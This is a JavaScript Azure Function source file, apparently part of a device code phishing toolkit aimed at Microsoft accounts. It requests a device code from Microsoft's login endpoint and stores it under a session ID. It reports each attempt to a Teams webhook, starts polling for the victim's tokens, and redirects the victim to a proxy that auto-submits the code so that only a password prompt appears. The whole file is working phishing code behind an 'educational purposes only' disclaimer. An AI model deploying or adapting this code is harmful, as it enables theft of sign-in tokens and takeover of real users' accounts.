/**
 * Azure Function Device Code Phishing - Auto-submit with code pre-validated
 * 
 * This proxies Microsoft's device auth flow, automatically submitting the code
 * so the user is taken directly to the sign-in page without entering any code.
 * 
 * Flow:
 * 1. User visits /deviceCode
 * 2. We generate a device code and store it
 * 3. We redirect user to /auth which proxies login.microsoftonline.com
 * 4. The proxy auto-submits the device code on their behalf
 * 5. User sees only the email/password prompt
 * 
 * This code is provided for educational purposes only and provided without any liability or warranty.
 */

const { app } = require("@azure/functions");
const axios = require('axios');
const { setSession } = require("./devicecode_store");

const client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2';
const devicecode_endpoint = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

app.http("landing", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {
    const url = new URL(request.url);

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: message }),
        }).catch((error) => console.log(error));
      }
    }

    // Step 1: Request a new device code from Microsoft
    const devicecode = await axios.post(devicecode_endpoint, {
      'client_id': client_id,
      'resource': 'https://graph.microsoft.com',
    }, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      }
    }).then(response => response.data)
      .catch((ex) => {
        console.error("Failed to get device code:", ex.response?.data || ex);
        return null;
      });

    if (!devicecode) {
      return new Response("Error generating device code", { status: 500 });
    }

    context.log(`Generated device code: ${devicecode.user_code}`);

    await dispatchMessage(
      `🎣 Device code generated: ${devicecode.user_code}<br>` +
      `Expires in: ${devicecode.expires_in}s`
    );

    // Generate a session ID for this phishing attempt
    const sessionId = crypto.randomUUID();
    setSession(sessionId, {
      user_code: devicecode.user_code,
      device_code: devicecode.device_code,
    });

    // Start polling for token in the background
    const baseUrl = `${url.protocol}//${url.host}`;
    axios.put(`${baseUrl}/deviceCode`, {
      'device_code': devicecode.device_code
    }).catch((ex) => console.error(ex));

    // Redirect to our proxy endpoint that will auto-submit the code
    return new Response(null, {
      status: 302,
      headers: {
        'Location': `${baseUrl}/auth?session=${sessionId}`
      }
    });
  },
});
